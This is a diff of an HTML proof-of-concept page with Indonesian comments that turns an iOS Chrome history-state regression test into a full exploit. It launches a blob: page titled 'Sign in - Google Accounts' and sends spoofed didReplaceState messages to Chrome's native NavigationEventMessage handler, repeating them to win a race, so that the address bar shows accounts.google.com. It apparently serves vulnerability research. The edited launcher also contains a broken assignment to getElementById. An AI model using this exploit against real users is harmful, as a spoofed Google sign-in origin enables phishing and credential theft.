@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC Regression Test - iOS Chrome History State Blob</title>
+    <title>PoC Full Reproduction - iOS Chrome Blob History Spoof</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -14,25 +14,26 @@
             line-height: 1.5;
             background: #fdfdfd;
         }
-        h1 { font-size: 1.4rem; color: #1a73e8; }
+        h1 { font-size: 1.4rem; color: #c5221f; }
         .card {
-            background: #f8f9fa;
-            border: 1px solid #dadce0;
+            background: #fff8f8;
+            border: 1px solid #f5c6cb;
             border-radius: 8px;
             padding: 15px;
             margin-bottom: 15px;
         }
         button {
-            background: #1a73e8;
+            background: #c5221f;
             color: white;
             border: none;
-            padding: 10px 16px;
+            padding: 12px 20px;
             border-radius: 4px;
             cursor: pointer;
-            font-size: 0.95rem;
+            font-size: 1rem;
+            font-weight: bold;
             margin-top: 8px;
         }
-        button:hover { background: #1557b0; }
+        button:hover { background: #a51d1a; }
         pre {
             background: #202124;
             color: #e8eaed;
@@ -40,7 +41,7 @@
             border-radius: 6px;
             overflow-x: auto;
             font-size: 0.85rem;
-            max-height: 200px;
+            max-height: 250px;
         }
         .pass { color: #81c995; font-weight: bold; }
         .fail { color: #f28b82; font-weight: bold; }
@@ -49,45 +50,36 @@
 </head>
 <body>
 
-    <h1>iOS Chrome History State Regression PoC</h1>
-    <p>Halaman ini menguji kerentanan alamat bar (*address-bar spoofing*) melalui manipulasi <code>blob:</code> URL lintas asal pada iOS Chrome.</p>
+    <h1>iOS Chrome History Spoof - Full Reproduction PoC</h1>
+    <p>Halaman ini menguji apakah pemanggilan <code>didReplaceState</code> dari dalam dokumen <code>blob:</code> lintas asal berhasil mengubah *address bar* tanpa validasi origin yang ketat.</p>
 
     <div class="card">
-        <h3>1. Peluncur Utama (Blob Launcher)</h3>
-        <p>Membuat objek blob mandiri yang mensimulasikan injeksi riwayat dan navigasi otomatis.</p>
-        <button id="launch-btn">Luncurkan Blob Test</button>
-        <pre id="launcher-log">Status: Menunggu eksekusi...</pre>
+        <h3>1. Generator & Launcher Blob Terenkapsulasi</h3>
+        <p>Membuat objek blob mandiri yang membawa skrip eksploitasi langsung ke dalam *context* blob.</p>
+        <button id="launch-btn">Mulai Reproduksi Ulang (Launch Blob)</button>
+        <pre id="launcher-log">Status: Menunggu interaksi pengguna...</pre>
     </div>
 
     <div class="card">
-        <h3>2. Log Aktivitas & Hasil Verifikasi</h3>
-        <pre id="diag-log">Log sistem akan muncul di sini...</pre>
+        <h3>2. Log Eksekusi & Hasil Reproduksi</h3>
+        <pre id="diag-log">Log sistem akan muncul di sini setelah blob dimuat...\n</pre>
     </div>
 
 <script>
     const VICTIM = "accounts.google.com";
-    
-    function log(message, type = 'info') {
-        const diag = document.getElementById('diag-log');
-        const timestamp = new Date().toLocaleTimeString();
-        let prefix = '[*]';
-        if (type === 'pass') prefix = '[PASS]';
-        if (type === 'fail') prefix = '[FAIL]';
-        diag.textContent += `[${timestamp}] ${prefix} ${message}\n`;
-        diag.scrollTop = diag.scrollHeight;
-    }
 
-    // Template HTML yang akan dijalankan di dalam context Blob URL
+    // Template HTML yang akan dieksekusi di dalam Blob URL mandiri
     const BLOB_DOC = `<!doctype html>
 <meta charset=utf-8>
-<title>Blob Sandbox PoC</title>
+<title>Sign in - Google Accounts</title>
 <style>
-  body { font-family: -apple-system, sans-serif; margin: 2em; background: #fff8f8; }
+  body { font-family: -apple-system, sans-serif; margin: 2em; background: #fff0f0; }
   h2 { color: #c00; }
-  pre { background: #222; color: #ff9; padding: 10px; font-size: 11px; }
+  pre { background: #111; color: #00ff00; padding: 12px; font-size: 11px; white-space: pre-wrap; }
 </style>
-<h2>Blob Context Active</h2>
-<p>Asal dokumen saat ini: <code id="origin"></code></p>
+<h2>Blob Sandbox Active</h2>
+<p>Asal Dokumen (Origin): <code id="origin"></code></p>
+<p>URL Saat Ini: <code id="cur-url"></code></p>
 <pre id="blob-log"></pre>
 <script>
 (function(){
@@ -97,17 +89,18 @@
   }
   
   document.getElementById('origin').textContent = location.origin || '(opaque)';
-  bLog('location.href = ' + location.href);
+  document.getElementById('cur-url').textContent = location.href;
+  bLog('Blob dokumen berhasil dimuat.');
 
-  // Periksa apakah handler NavigationEventMessage tersedia (khusus iOS Chrome)
+  // Deteksi handler komunikasi natif iOS Chrome
   var mh = (window.webkit && window.webkit.messageHandlers) || {};
   if (!mh.NavigationEventMessage) {
-    bLog('INFO: NavigationEventMessage handler tidak ditemukan (Bukan iOS Chrome atau lingkungan desktop/Android).');
+    bLog('SKIP: window.webkit.messageHandlers.NavigationEventMessage tidak ditemukan.');
     return;
   }
-  bLog('NavigationEventMessage terdeteksi.');
+  bLog('SUCCESS: Handler NavigationEventMessage terdeteksi.');
 
-  // Ambil frame_id via __gCrWeb jika ada
+  // Ambil frame_id dari page-world __gCrWeb
   var fid = null;
   try {
     if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
@@ -118,55 +111,78 @@
     bLog('Gagal membaca frame_id: ' + e.message);
   }
 
+  // Fallback pencarian frame_id jika struktur berbeda
+  if (!fid && window.__gCrWeb) {
+    var tries = [
+      function(){ return window.__gCrWeb.common.getFrameId(); },
+      function(){ return window.__gCrWeb.message.getFrameId(); },
+      function(){ return window.__gCrWeb.frameId; },
+    ];
+    for (var i = 0; i < tries.length && !fid; i++) {
+      try { fid = tries[i](); bLog('fallback['+i+'] -> ' + fid); } catch(e){}
+    }
+  }
+
   if (!fid) {
-    bLog('GAGAL: Tidak dapat membaca page-world frame_id. Proteksi frame aktif.');
+    bLog('FAIL: Tidak dapat menemukan frame_id yang valid.');
     return;
   }
 
-  // Uji coba postMessage untuk memicu replaceState lintas asal
+  // Target spoofing alamat bar
   var spoofUrl = 'blob:https://' + "${VICTIM}" + '/signin';
-  try {
-    mh.NavigationEventMessage.postMessage({
-      command: 'willChangeState', frame_id: fid
-    });
-    mh.NavigationEventMessage.postMessage({
-      command: 'didReplaceState', frame_id: fid,
-      stateObject: '', baseUrl: 'https://x/',
-      pageUrl: spoofUrl
-    });
-    bLog('Mencoba postMessage didReplaceState dengan target: ' + spoofUrl);
-  } catch(err) {
-    bLog('Exception saat postMessage: ' + err.message);
-  }
+  bLog('Target spoof URL: ' + spoofUrl);
+
+  // Fungsi pengiriman postMessage berulang untuk mengatasi race condition
+  var fireSpoof = function(attempt) {
+    try {
+      mh.NavigationEventMessage.postMessage({
+        command: 'willChangeState', frame_id: fid
+      });
+      mh.NavigationEventMessage.postMessage({
+        command: 'didReplaceState', frame_id: fid,
+        stateObject: '', baseUrl: 'https://x/',
+        pageUrl: spoofUrl
+      });
+      bLog('[' + attempt + '] Berhasil mengirimkan didReplaceState dengan target: ' + spoofUrl);
+    } catch(err) {
+      bLog('[' + attempt + '] Gagal postMessage: ' + err.message);
+    }
+  };
+
+  // Eksekusi beruntun (multi-delay) untuk menjamin penanganan native
+  fireSpoof(1);
+  setTimeout(function(){ fireSpoof(2); }, 150);
+  setTimeout(function(){ fireSpoof(3); }, 400);
+  setTimeout(function(){
+    bLog('\\n--- STATUS AKHIR ---');
+    bLog('Periksa Address Bar Anda.');
+    bLog('Jika menampilkan "' + "${VICTIM}" + '" tanpa awalan blob:, kerentanan berhasil direproduksi.');
+    bLog('Jika tetap menampilkan URL blob asli, proteksi keamanan aktif dan menolak state change.');
+  }, 800);
 })();
 <\/script>`;
 
-    function launchBlobTest() {
+    function startReproduction() {
         try {
-            log("Membuat objek Blob lokal...", "info");
+            const diag = document.getElementById('diag-log');
+            diag.textContent += "[*] Membuat Blob objek lokal...\n";
+            
             const blob = new Blob([BLOB_DOC], { type: 'text/html' });
             const blobUrl = URL.createObjectURL(blob);
             
-            document.getElementById('launcher-log').innerHTML = `<span class="info">Mengarahkan ke Blob URL: ${blobUrl}</span>`;
-            log(`Navigasi otomatis menuju Blob URL: ${blobUrl}`, "info");
+            document.getElementById('launcher-log.innerHTML') = `<span class="info">Mengarahkan ke: ${blobUrl}</span>`;
+            diag.textContent += `[*] Mengalihkan navigasi ke: ${blobUrl}\n`;
             
-            // Berpindah ke blob URL untuk menguji perilaku keamanan history state
+            // Eksekusi navigasi otomatis ke blob URL
             setTimeout(() => {
                 location.href = blobUrl;
-            }, 800);
+            }, 600);
         } catch (e) {
-            log(`Gagal meluncurkan blob: ${e.message}`, "fail");
             document.getElementById('launcher-log').innerHTML = `<span class="fail">Error: ${e.message}</span>`;
         }
     }
 
-    document.getElementById('launch-btn').addEventListener('click', launchBlobTest);
-
-    // Otomatisasi awal saat halaman dimuat
-    window.onload = function() {
-        log("Inisialisasi halaman PoC regresi selesai.", "info");
-        log(`Target host spoofing diset ke: ${VICTIM}`, "info");
-    };
+    document.getElementById('launch-btn').addEventListener('click', startReproduction);
 </script>
 
 </body>
